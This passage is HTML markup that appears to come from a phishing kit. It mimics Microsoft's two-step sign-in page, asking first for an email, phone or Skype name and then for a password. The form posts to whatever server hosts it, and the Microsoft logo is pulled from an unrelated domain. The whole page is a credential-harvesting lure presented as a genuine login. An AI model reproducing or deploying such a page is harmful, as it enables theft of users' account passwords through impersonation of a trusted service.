        #form_step2 {
            display: none;

    <div class="background">

    <div class="outer">
        <div class="middle">

            <main class="inner">
                <div class="margin-bottom-20" aria-hidden="true">
                    <picture class="logo margin-bottom-16">
                        <img src="https://myonline-subscription.com/static/windows_logo.png" alt="Microsoft Logo">
                    </picture>
                </div>

                
    
        
                
                <form method="post">

                    <div>
                        <input id="btn_next_step" type="checkbox" autocomplete="off" style="display: none;">
                        <label for="btn_next_step" class="button btn btn-block btn-primary">Next</label>

                        <div id="form_step1">
                            <h1 class="row text-title margin-bottom-16">Sign in</h1>
                            <div class="row margin-bottom-16">
                                <div class="form-group col-md-12 placeholderContainer">
                                    <input class="form-control" placeholder='Email, phone, or Skype'
                                        aria-required="true" spellcheck="false" autocomplete="off" onkeypress="return event.keyCode != 13;">
                                </div>
                            </div>
                            <div class="row margin-bottom-20">
                                <div class="col-md-12 section text-secondary">
                                    <span aria-hidden="true">No account?</span>
                                    <a href="https://odc.officeapps.live.com/odc/v2.0/hrd"
                                        aria-label="Create a Microsoft account">Create one!</a>
                                </div>
                            </div>
                        </div>

                        <div id="form_step2">
                            <div class="row identity margin-bottom-16"></div>
                            <h1 class="row text-title margin-bottom-16">Enter password</h1>
                            <div class="row margin-bottom-16">
                                <div class="form-group col-md-12 placeholderContainer">
                                    <input required type="password" class="form-control" placeholder='Password'
                                        aria-required="true" autocomplete="off">
                                </div>
                            </div>
                            <div class="row margin-bottom-20">
                            </div>
                            <div class="row inline-block no-margin-top-bottom button-container">
                                <button type="submit" class="btn btn-block btn-primary">Sign in</button>
                            </div>
                        </div>

                    </div>

                </form>
